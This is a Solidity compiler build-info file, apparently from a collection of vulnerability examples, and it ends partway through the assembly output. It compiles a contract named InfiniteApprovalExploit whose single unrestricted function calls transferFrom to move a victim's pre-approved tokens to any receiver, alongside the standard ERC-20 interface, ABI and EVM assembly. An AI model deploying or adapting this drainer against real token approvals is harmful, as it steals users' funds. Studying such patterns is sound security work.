{
	"id": "eaa289f28abcba33f3eb80cdc70ef413",
	"_format": "hh-sol-build-info-1",
	"solcVersion": "0.8.29",
	"solcLongVersion": "0.8.29+commit.ab55807c",
	"input": {
		"language": "Solidity",
		"sources": {
			"I/Exploitable Transfer Using Pre-approved Infinite Allowance.sol": {
				"content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.20;\n\nimport \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\n\ncontract InfiniteApprovalExploit {\n    function exploit(address token, address victim, address receiver, uint256 amount) external {\n        // Assumes victim approved this contract for max allowance\n        IERC20(token).transferFrom(victim, receiver, amount);\n    }\n}\n"
			},
			"@openzeppelin/contracts/token/ERC20/IERC20.sol": {
				"content": "// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts (last updated v5.1.0) (token/ERC20/IERC20.sol)\n\npragma solidity ^0.8.20;\n\n/**\n * @dev Interface of the ERC-20 standard as defined in the ERC.\n */\ninterface IERC20 {\n    /**\n     * @dev Emitted when `value` tokens are moved from one account (`from`) to\n     * another (`to`).\n     *\n     * Note that `value` may be zero.\n     */\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    /**\n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\n     * a call to {approve}. `value` is the new allowance.\n     */\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n\n    /**\n     * @dev Returns the value of tokens in existence.\n     */\n    function totalSupply() external view returns (uint256);\n\n    /**\n     * @dev Returns the value of tokens owned by `account`.\n     */\n    function balanceOf(address account) external view returns (uint256);\n\n    /**\n     * @dev Moves a `value` amount of tokens from the caller's account to `to`.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * Emits a {Transfer} event.\n     */\n    function transfer(address to, uint256 value) external returns (bool);\n\n    /**\n     * @dev Returns the remaining number of tokens that `spender` will be\n     * allowed to spend on behalf of `owner` through {transferFrom}. This is\n     * zero by default.\n     *\n     * This value changes when {approve} or {transferFrom} are called.\n     */\n    function allowance(address owner, address spender) external view returns (uint256);\n\n    /**\n     * @dev Sets a `value` amount of tokens as the allowance of `spender` over the\n     * caller's tokens.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * IMPORTANT: Beware that changing an allowance with this method brings the risk\n     * that someone may use both the old and the new allowance by unfortunate\n     * transaction ordering. One possible solution to mitigate this race\n     * condition is to first reduce the spender's allowance to 0 and set the\n     * desired value afterwards:\n     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\n     *\n     * Emits an {Approval} event.\n     */\n    function approve(address spender, uint256 value) external returns (bool);\n\n    /**\n     * @dev Moves a `value` amount of tokens from `from` to `to` using the\n     * allowance mechanism. `value` is then deducted from the caller's\n     * allowance.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * Emits a {Transfer} event.\n     */\n    function transferFrom(address from, address to, uint256 value) external returns (bool);\n}\n"
			}
		},
		"settings": {
			"optimizer": {
				"enabled": false,
				"runs": 200
			},
			"outputSelection": {
				"*": {
					"": [
						"ast"
					],
					"*": [
						"abi",
						"metadata",
						"devdoc",
						"userdoc",
						"storageLayout",
						"evm.legacyAssembly",
						"evm.bytecode",
						"evm.deployedBytecode",
						"evm.methodIdentifiers",
						"evm.gasEstimates",
						"evm.assembly"
					]
				}
			},
			"remappings": []
		}
	},
	"output": {
		"contracts": {
			"@openzeppelin/contracts/token/ERC20/IERC20.sol": {
				"IERC20": {
					"abi": [
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": true,
									"internalType": "address",
									"name": "owner",
									"type": "address"
								},
								{
									"indexed": true,
									"internalType": "address",
									"name": "spender",
									"type": "address"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "value",
									"type": "uint256"
								}
							],
							"name": "Approval",
							"type": "event"
						},
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": true,
									"internalType": "address",
									"name": "from",
									"type": "address"
								},
								{
									"indexed": true,
									"internalType": "address",
									"name": "to",
									"type": "address"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "value",
									"type": "uint256"
								}
							],
							"name": "Transfer",
							"type": "event"
						},
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "owner",
									"type": "address"
								},
								{
									"internalType": "address",
									"name": "spender",
									"type": "address"
								}
							],
							"name": "allowance",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "spender",
									"type": "address"
								},
								{
									"internalType": "uint256",
									"name": "value",
									"type": "uint256"
								}
							],
							"name": "approve",
							"outputs": [
								{
									"internalType": "bool",
									"name": "",
									"type": "bool"
								}
							],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "account",
									"type": "address"
								}
							],
							"name": "balanceOf",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "totalSupply",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "to",
									"type": "address"
								},
								{
									"internalType": "uint256",
									"name": "value",
									"type": "uint256"
								}
							],
							"name": "transfer",
							"outputs": [
								{
									"internalType": "bool",
									"name": "",
									"type": "bool"
								}
							],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "from",
									"type": "address"
								},
								{
									"internalType": "address",
									"name": "to",
									"type": "address"
								},
								{
									"internalType": "uint256",
									"name": "value",
									"type": "uint256"
								}
							],
							"name": "transferFrom",
							"outputs": [
								{
									"internalType": "bool",
									"name": "",
									"type": "bool"
								}
							],
							"stateMutability": "nonpayable",
							"type": "function"
						}
					],
					"devdoc": {
						"details": "Interface of the ERC-20 standard as defined in the ERC.",
						"events": {
							"Approval(address,address,uint256)": {
								"details": "Emitted when the allowance of a `spender` for an `owner` is set by a call to {approve}. `value` is the new allowance."
							},
							"Transfer(address,address,uint256)": {
								"details": "Emitted when `value` tokens are moved from one account (`from`) to another (`to`). Note that `value` may be zero."
							}
						},
						"kind": "dev",
						"methods": {
							"allowance(address,address)": {
								"details": "Returns the remaining number of tokens that `spender` will be allowed to spend on behalf of `owner` through {transferFrom}. This is zero by default. This value changes when {approve} or {transferFrom} are called."
							},
							"approve(address,uint256)": {
								"details": "Sets a `value` amount of tokens as the allowance of `spender` over the caller's tokens. Returns a boolean value indicating whether the operation succeeded. IMPORTANT: Beware that changing an allowance with this method brings the risk that someone may use both the old and the new allowance by unfortunate transaction ordering. One possible solution to mitigate this race condition is to first reduce the spender's allowance to 0 and set the desired value afterwards: https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729 Emits an {Approval} event."
							},
							"balanceOf(address)": {
								"details": "Returns the value of tokens owned by `account`."
							},
							"totalSupply()": {
								"details": "Returns the value of tokens in existence."
							},
							"transfer(address,uint256)": {
								"details": "Moves a `value` amount of tokens from the caller's account to `to`. Returns a boolean value indicating whether the operation succeeded. Emits a {Transfer} event."
							},
							"transferFrom(address,address,uint256)": {
								"details": "Moves a `value` amount of tokens from `from` to `to` using the allowance mechanism. `value` is then deducted from the caller's allowance. Returns a boolean value indicating whether the operation succeeded. Emits a {Transfer} event."
							}
						},
						"version": 1
					},
					"evm": {
						"assembly": "",
						"bytecode": {
							"functionDebugData": {},
							"generatedSources": [],
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"deployedBytecode": {
							"functionDebugData": {},
							"generatedSources": [],
							"immutableReferences": {},
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"gasEstimates": null,
						"legacyAssembly": null,
						"methodIdentifiers": {
							"allowance(address,address)": "dd62ed3e",
							"approve(address,uint256)": "095ea7b3",
							"balanceOf(address)": "70a08231",
							"totalSupply()": "18160ddd",
							"transfer(address,uint256)": "a9059cbb",
							"transferFrom(address,address,uint256)": "23b872dd"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.8.29+commit.ab55807c\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"details\":\"Interface of the ERC-20 standard as defined in the ERC.\",\"events\":{\"Approval(address,address,uint256)\":{\"details\":\"Emitted when the allowance of a `spender` for an `owner` is set by a call to {approve}. `value` is the new allowance.\"},\"Transfer(address,address,uint256)\":{\"details\":\"Emitted when `value` tokens are moved from one account (`from`) to another (`to`). Note that `value` may be zero.\"}},\"kind\":\"dev\",\"methods\":{\"allowance(address,address)\":{\"details\":\"Returns the remaining number of tokens that `spender` will be allowed to spend on behalf of `owner` through {transferFrom}. This is zero by default. This value changes when {approve} or {transferFrom} are called.\"},\"approve(address,uint256)\":{\"details\":\"Sets a `value` amount of tokens as the allowance of `spender` over the caller's tokens. Returns a boolean value indicating whether the operation succeeded. IMPORTANT: Beware that changing an allowance with this method brings the risk that someone may use both the old and the new allowance by unfortunate transaction ordering. One possible solution to mitigate this race condition is to first reduce the spender's allowance to 0 and set the desired value afterwards: https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729 Emits an {Approval} event.\"},\"balanceOf(address)\":{\"details\":\"Returns the value of tokens owned by `account`.\"},\"totalSupply()\":{\"details\":\"Returns the value of tokens in existence.\"},\"transfer(address,uint256)\":{\"details\":\"Moves a `value` amount of tokens from the caller's account to `to`. Returns a boolean value indicating whether the operation succeeded. Emits a {Transfer} event.\"},\"transferFrom(address,address,uint256)\":{\"details\":\"Moves a `value` amount of tokens from `from` to `to` using the allowance mechanism. `value` is then deducted from the caller's allowance. Returns a boolean value indicating whether the operation succeeded. Emits a {Transfer} event.\"}},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"@openzeppelin/contracts/token/ERC20/IERC20.sol\":\"IERC20\"},\"evmVersion\":\"cancun\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"@openzeppelin/contracts/token/ERC20/IERC20.sol\":{\"keccak256\":\"0xe06a3f08a987af6ad2e1c1e774405d4fe08f1694b67517438b467cecf0da0ef7\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://df6f0c459663c9858b6cba2cda1d14a7d05a985bed6d2de72bd8e78c25ee79db\",\"dweb:/ipfs/QmeTTxZ7qVk9rjEv2R4CpCwdf8UMCcRqDNMvzNxHc3Fnn9\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [],
						"types": null
					},
					"userdoc": {
						"kind": "user",
						"methods": {},
						"version": 1
					}
				}
			},
			"I/Exploitable Transfer Using Pre-approved Infinite Allowance.sol": {
				"InfiniteApprovalExploit": {
					"abi": [
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "token",
									"type": "address"
								},
								{
									"internalType": "address",
									"name": "victim",
									"type": "address"
								},
								{
									"internalType": "address",
									"name": "receiver",
									"type": "address"
								},
								{
									"internalType": "uint256",
									"name": "amount",
									"type": "uint256"
								}
							],
							"name": "exploit",
							"outputs": [],
							"stateMutability": "nonpayable",
							"type": "function"
						}
					],
					"devdoc": {
						"kind": "dev",
						"methods": {},
						"version": 1
					},
					"evm": {
						"assembly": "    /* \"I/Exploitable Transfer Using Pre-approved Infinite Allowance.sol\":116:384  contract InfiniteApprovalExploit {... */\n  mstore(0x40, 0x80)\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  revert(0x00, 0x00)\ntag_1:\n  pop\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"I/Exploitable Transfer Using Pre-approved Infinite Allowance.sol\":116:384  contract InfiniteApprovalExploit {... */\n      mstore(0x40, 0x80)\n      callvalue\n      dup1\n      iszero\n      tag_1\n      jumpi\n      revert(0x00, 0x00)\n    tag_1:\n      pop\n      jumpi(tag_2, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0xbdc813c4\n      eq\n      tag_3\n      jumpi\n    tag_2:\n      revert(0x00, 0x00)\n        /* \"I/Exploitable Transfer Using Pre-approved Infinite Allowance.sol\":155:382  function exploit(address token, address victim, address receiver, uint256 amount) external {... */\n    tag_3:\n      tag_4\n      0x04\n      dup1\n      calldatasize\n      sub\n      dup2\n      add\n      swap1\n      tag_5\n      swap2\n      swap1\n      tag_6\n      jump\t// in\n    tag_5:\n      tag_7\n      jump\t// in\n    tag_4:\n      stop\n    tag_7:\n        /* \"I/Exploitable Transfer Using Pre-approved Infinite Allowance.sol\":330:335  token */\n      dup4\n        /* \"I/Exploitable Transfer Using Pre-approved Infinite Allowance.sol\":323:349  IERC20(token).transferFrom */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x23b872dd\n        /* \"I/Exploitable Transfer Using Pre-approved Infinite Allowance.sol\":350:356  victim */\n      dup5\n        /* \"I/Exploitable Transfer Using Pre-approved Infinite Allowance.sol\":358:366  receiver */\n      dup5\n        /* \"I/Exploitable Transfer Using Pre-approved Infinite Allowance.sol\":368:374  amount */\n      dup5\n        /* \"I/Exploitable Transfer Using Pre-approved Infinite Allowance.sol\":323:375  IERC20(token).transferFrom(victim, receiver, amount) */\n      mload(0x40)\n      dup5\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_9\n      swap4\n      swap3\n      swap2\n      swap1\n      tag_10\n      jump\t// in\n    tag_9:\n      0x20\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_12\n      jumpi\n      returndatacopy(0x00, 0x00, returndatasize)\n      revert(0x00, returndatasize)\n    tag_12:\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n      not(0x1f)\n      0x1f\n      dup3\n      add\n      and\n      dup3\n      add\n      dup1\n      0x40\n      mstore\n      pop\n      dup2\n      add\n      swap1\n      tag_13\n      swap2\n      swap1\n      tag_14\n      jump\t// in\n    tag_13:\n      pop\n        /* \"I/Exploitable Transfer Using Pre-approved Infinite Allowance.sol\":155:382  function exploit(address token, address victim, address receiver, uint256 amount) external {... */\n      pop\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":88:205   */\n    tag_16:\n        /* \"#utility.yul\":197:198   */\n      0x00\n        /* \"#utility.yul\":194:195   */\n      0x00\n        /* \"#utility.yul\":187:199   */\n      revert\n        /* \"#utility.yul\":334:460   */\n    tag_18:\n        /* \"#utility.yul\":371:378   */\n      0x00\n        /* \"#utility.yul\":411:453   */\n      0xffffffffffffffffffffffffffffffffffffffff\n        /* \"#utility.yul\":404:409   */\n      dup3\n        /* \"#utility.yul\":400:454   */\n      and\n        /* \"#utility.yul\":389:454   */\n      swap1\n      pop\n        /* \"#utility.yul\":334:460   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":466:562   */\n    tag_19:\n        /* \"#utility.yul\":503:510   */\n      0x00\n        /* \"#utility.yul\":532:556   */\n      tag_36\n        /* \"#utility.yul\":550:555   */\n      dup3\n        /* \"#utility.yul\":532:556   */\n      tag_18\n      jump\t// in\n    tag_36:\n        /* \"#utility.yul\":521:556   */\n      swap1\n      pop\n        /* \"#utility.yul\":466:562   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":568:690   */\n    tag_20:\n        /* \"#utility.yul\":641:665   */\n      tag_38\n        /* \"#utility.yul\":659:664   */\n      dup2\n        /* \"#utility.yul\":641:665   */\n      tag_19\n      jump\t// in\n    tag_38:\n        /* \"#utility.yul\":634:639   */\n      dup2\n        /* \"#utility.yul\":631:666   */\n      eq\n        /* \"#utility.yul\":621:684   */\n      tag_39\n      jumpi\n        /* \"#utility.yul\":680:681   */\n      0x00\n        /* \"#utility.yul\":677:678   */\n      0x00\n        /* \"#utility.yul\":670:682   */\n      revert\n        /* \"#utility.yul\":621:684   */\n    tag_39:\n        /* \"#utility.yul\":568:690   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":696:835   */\n    tag_21:\n        /* \"#utility.yul\":742:747   */\n      0x00\n        /* \"#utility.yul\":780:786   */\n      dup2\n        /* \"#utility.yul\":767:787   */\n      calldataload\n        /* \"#utility.yul\":758:787   */\n      swap1\n      pop\n        /* \"#utility.yul\":796:829   */\n      tag_41\n        /* \"#utility.yul\":823:828   */\n      dup2\n        /* \"#utility.yul\":796:829   */\n      tag_20\n      jump\t// in\n    tag_41:\n        /* \"#utility.yul\":696:835   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":841:918   */\n    tag_22:\n        /* \"#utility.yul\":878:885   */\n      0x00\n        /* \"#utility.yul\":907:912   */\n      dup2\n        /* \"#utility.yul\":896:912   */\n      swap1\n      pop\n        /* \"#utility.yul\":841:918   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":924:1046   */\n    tag_23:\n        /* \"#utility.yul\":997:1021   */\n      tag_44\n        /* \"#utility.yul\":1015:1020   */\n      dup2\n        /* \"#utility.yul\":997:1021   */\n      tag_22\n      jump\t// in\n    tag_44:\n        /* \"#utility.yul\":990:995   */\n      dup2\n        /* \"#utility.yul\":987:1022   */\n      eq\n        /* \"#utility.yul\":977:1040   */\n      tag_45\n      jumpi\n        /* \"#utility.yul\":1036:1037   */\n      0x00\n        /* \"#utility.yul\":1033:1034   */\n      0x00\n        /* \"#utility.yul\":1026:1038   */\n      revert\n        /* \"#utility.yul\":977:1040   */\n    tag_45:\n        /* \"#utility.yul\":924:1046   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1052:1191   */\n    tag_24:\n        /* \"#utility.yul\":1098:1103   */\n      0x00\n        /* \"#utility.yul\":1136:1142   */\n      dup2\n        /* \"#utility.yul\":1123:1143   */\n      calldataload\n        /* \"#utility.yul\":1114:1143   */\n      swap1\n      pop\n        /* \"#utility.yul\":1152:1185   */\n      tag_47\n        /* \"#utility.yul\":1179:1184   */\n      dup2\n        /* \"#utility.yul\":1152:1185   */\n      tag_23\n      jump\t// in\n    tag_47:\n        /* \"#utility.yul\":1052:1191   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1197:1962   */\n    tag_6:\n        /* \"#utility.yul\":1283:1289   */\n      0x00\n        /* \"#utility.yul\":1291:1297   */\n      0x00\n        /* \"#utility.yul\":1299:1305   */\n      0x00\n        /* \"#utility.yul\":1307:1313   */\n      0x00\n        /* \"#utility.yul\":1356:1359   */\n      0x80\n        /* \"#utility.yul\":1344:1353   */\n      dup6\n        /* \"#utility.yul\":1335:1342   */\n      dup8\n        /* \"#utility.yul\":1331:1354   */\n      sub\n        /* \"#utility.yul\":1327:1360   */\n      slt\n        /* \"#utility.yul\":1324:1444   */\n      iszero\n      tag_49\n      jumpi\n        /* \"#utility.yul\":1363:1442   */\n      tag_50\n      tag_16\n      jump\t// in\n    tag_50:\n        /* \"#utility.yul\":1324:1444   */\n    tag_49:\n        /* \"#utility.yul\":1483:1484   */\n      0x00\n        /* \"#utility.yul\":1508:1561   */\n      tag_51\n        /* \"#utility.yul\":1553:1560   */\n      dup8\n        /* \"#utility.yul\":1544:1550   */\n      dup3\n        /* \"#utility.yul\":1533:1542   */\n      dup9\n        /* \"#utility.yul\":1529:1551   */\n      add\n        /* \"#utility.yul\":1508:1561   */\n      tag_21\n      jump\t// in\n    tag_51:\n        /* \"#utility.yul\":1498:1561   */\n      swap5\n      pop\n        /* \"#utility.yul\":1454:1571   */\n      pop\n        /* \"#utility.yul\":1610:1612   */\n      0x20\n        /* \"#utility.yul\":1636:1689   */\n      tag_52\n        /* \"#utility.yul\":1681:1688   */\n      dup8\n        /* \"#utility.yul\":1672:1678   */\n      dup3\n        /* \"#utility.yul\":1661:1670   */\n      dup9\n        /* \"#utility.yul\":1657:1679   */\n      add\n        /* \"#utility.yul\":1636:1689   */\n      tag_21\n      jump\t// in\n    tag_52:\n        /* \"#utility.yul\":1626:1689   */\n      swap4\n      pop\n        /* \"#utility.yul\":1581:1699   */\n      pop\n        /* \"#utility.yul\":1738:1740   */\n      0x40\n        /* \"#utility.yul\":1764:1817   */\n      tag_53\n        /* \"#utility.yul\":1809:1816   */\n      dup8\n        /* \"#utility.yul\":1800:1806   */\n      dup3\n        /* \"#utility.yul\":1789:1798   */\n      dup9\n        /* \"#utility.yul\":1785:1807   */\n      add\n        /* \"#utility.yul\":1764:1817   */\n      tag_21\n      jump\t// in\n    tag_53:\n        /* \"#utility.yul\":1754:1817   */\n      swap3\n      pop\n        /* \"#utility.yul\":1709:1827   */\n      pop\n        /* \"#utility.yul\":1866:1868   */\n      0x60\n        /* \"#utility.yul\":1892:1945   */\n      tag_54\n        /* \"#utility.yul\":1937:1944   */\n      dup8\n        /* \"#utility.yul\":1928:1934   */\n      dup3\n        /* \"#utility.yul\":1917:1926   */\n      dup9\n        /* \"#utility.yul\":1913:1935   */\n      add\n        /* \"#utility.yul\":1892:1945   */\n      tag_24\n      jump\t// in\n    tag_54:\n        /* \"#utility.yul\":1882:1945   */\n      swap2\n      pop\n        /* \"#utility.yul\":1837:1955   */\n      pop\n        /* \"#utility.yul\":1197:1962   */\n      swap3\n      swap6\n      swap2\n      swap5\n      pop\n      swap3\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1968:2086   */\n    tag_25:\n        /* \"#utility.yul\":2055:2079   */\n      tag_56\n        /* \"#utility.yul\":2073:2078   */\n      dup2\n        /* \"#utility.yul\":2055:2079   */\n      tag_19\n      jump\t// in\n    tag_56:\n        /* \"#utility.yul\":2050:2053   */\n      dup3\n        /* \"#utility.yul\":2043:2080   */\n      mstore\n        /* \"#utility.yul\":1968:2086   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2092:2210   */\n    tag_26:\n        /* \"#utility.yul\":2179:2203   */\n      tag_58\n        /* \"#utility.yul\":2197:2202   */\n      dup2\n        /* \"#utility.yul\":2179:2203   */\n      tag_22\n      jump\t// in\n    tag_58:\n        /* \"#utility.yul\":2174:2177   */\n      dup3\n        /* \"#utility.yul\":2167:2204   */\n      mstore\n        /* \"#utility.yul\":2092:2210   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2216:2658   */\n    tag_10:\n        /* \"#utility.yul\":2365:2369   */\n      0x00\n        /* \"#utility.yul\":2403:2405   */\n      0x60\n        /* \"#utility.yul\":2392:2401   */\n      dup3\n        /* \"#utility.yul\":2388:2406   */\n      add\n        /* \"#utility.yul\":2380:2406   */\n      swap1\n      pop\n        /* \"#utility.yul\":2416:2487   */\n      tag_60\n        /* \"#utility.yul\":2484:2485   */\n      0x00\n        /* \"#utility.yul\":2473:2482   */\n      dup4\n        /* \"#utility.yul\":2469:2486   */\n      add\n        /* \"#utility.yul\":2460:2466   */\n      dup7\n        /* \"#utility.yul\":2416:2487   */\n      tag_25\n      jump\t// in\n    tag_60:\n        /* \"#utility.yul\":2497:2569   */\n      tag_61\n        /* \"#utility.yul\":2565:2567   */\n      0x20\n        /* \"#utility.yul\":2554:2563   */\n      dup4\n        /* \"#utility.yul\":2550:2568   */\n      add\n        /* \"#utility.yul\":2541:2547   */\n      dup6\n        /* \"#utility.yul\":2497:2569   */\n      tag_25\n      jump\t// in\n    tag_61:\n        /* \"#utility.yul\":2579:2651   */\n      tag_62\n        /* \"#utility.yul\":2647:2649   */\n      0x40\n        /* \"#utility.yul\":2636:2645   */\n      dup4\n        /* \"#utility.yul\":2632:2650   */\n      add\n        /* \"#utility.yul\":2623:2629   */\n      dup5\n        /* \"#utility.yul\":2579:2651   */\n      tag_26\n      jump\t// in\n    tag_62:\n        /* \"#utility.yul\":2216:2658   */\n      swap5\n      swap4\n      pop\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2664:2754   */\n    tag_27:\n        /* \"#utility.yul\":2698:2705   */\n      0x00\n        /* \"#utility.yul\":2741:2746   */\n      dup2\n        /* \"#utility.yul\":2734:2747   */\n      iszero\n        /* \"#utility.yul\":2727:2748   */\n      iszero\n        /* \"#utility.yul\":2716:2748   */\n      swap1\n      pop\n        /* \"#utility.yul\":2664:2754   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2760:2876   */\n    tag_28:\n        /* \"#utility.yul\":2830:2851   */\n      tag_65\n        /* \"#utility.yul\":2845:2850   */\n      dup2\n        /* \"#utility.yul\":2830:2851   */\n      tag_27\n      jump\t// in\n    tag_65:\n        /* \"#utility.yul\":2823:2828   */\n      dup2\n        /* \"#utility.yul\":2820:2852   */\n      eq\n        /* \"#utility.yul\":2810:2870   */\n      tag_66\n      jumpi\n        /* \"#utility.yul\":2866:2867   */\n      0x00\n        /* \"#utility.yul\":2863:2864   */\n      0x00\n        /* \"#utility.yul\":2856:2868   */\n      revert\n        /* \"#utility.yul\":2810:2870   */\n    tag_66:\n        /* \"#utility.yul\":2760:2876   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2882:3019   */\n    tag_29:\n        /* \"#utility.yul\":2936:2941   */\n      0x00\n        /* \"#utility.yul\":2967:2973   */\n      dup2\n        /* \"#utility.yul\":2961:2974   */\n      mload\n        /* \"#utility.yul\":2952:2974   */\n      swap1\n      pop\n        /* \"#utility.yul\":2983:3013   */\n      tag_68\n        /* \"#utility.yul\":3007:3012   */\n      dup2\n        /* \"#utility.yul\":2983:3013   */\n      tag_28\n      jump\t// in\n    tag_68:\n        /* \"#utility.yul\":2882:3019   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3025:3370   */\n    tag_14:\n        /* \"#utility.yul\":3092:3098   */\n      0x00\n        /* \"#utility.yul\":3141:3143   */\n      0x20\n        /* \"#utility.yul\":3129:3138   */\n      dup3\n        /* \"#utility.yul\":3120:3127   */\n      dup5\n        /* \"#utility.yul\":3116:3139   */\n      sub\n        /* \"#utility.yul\":3112:3144   */\n      slt\n        /* \"#utility.yul\":3109:3228   */\n      iszero\n      tag_70\n      jumpi\n        /* \"#utility.yul\":3147:3226   */\n      tag_71\n      tag_16\n      jump\t// in\n    tag_71:\n        /* \"#utility.yul\":3109:3228   */\n    tag_70:\n        /* \"#utility.yul\":3267:3268   */\n      0x00\n        /* \"#utility.yul\":3292:3353   */\n      tag_72\n        /* \"#utility.yul\":3345:3352   */\n      dup5\n        /* \"#utility.yul\":3336:3342   */\n      dup3\n        /* \"#utility.yul\":3325:3334   */\n      dup6\n        /* \"#utility.yul\":3321:3343   */\n      add\n        /* \"#utility.yul\":3292:3353   */\n      tag_29\n      jump\t// in\n    tag_72:\n        /* \"#utility.yul\":3282:3353   */\n      swap2\n      pop\n        /* \"#utility.yul\":3238:3363   */\n      pop\n        /* \"#utility.yul\":3025:3370   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n\n    auxdata: 